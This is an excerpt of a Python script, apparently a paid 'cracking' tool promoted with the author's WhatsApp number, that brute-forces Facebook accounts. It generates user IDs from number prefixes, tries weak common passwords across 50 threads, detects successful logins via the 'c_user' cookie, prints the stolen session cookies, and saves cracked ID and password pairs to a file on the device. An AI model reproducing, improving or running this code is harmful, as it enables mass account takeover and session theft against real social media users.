#HK(MD HRIDOOY YT)(MD HRIDOY.KHAN)
#WhatsApp : 01323176125
#Github : BAYGID 8
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Hk")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/Hk100/game.py/main/game.txt').text
...
╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝╚═════╝                                            
  ...
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of MD BAYGID \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801323176125\033[1;37m ")
  print(f"")
  ...
  #os.system(f'xdg-open https://www.facebook.com/md.baygid.1428')
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801323176125');time.sleep(1)
		admin()
	if bal =='2':
...
def virus3():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','55667','667788','112233','123123','freefire','freefire123']
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mHRIDOY\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [HRIDOY-OK] '+cid+' | '+ps+'\33[0;92m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/HRIDOY-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
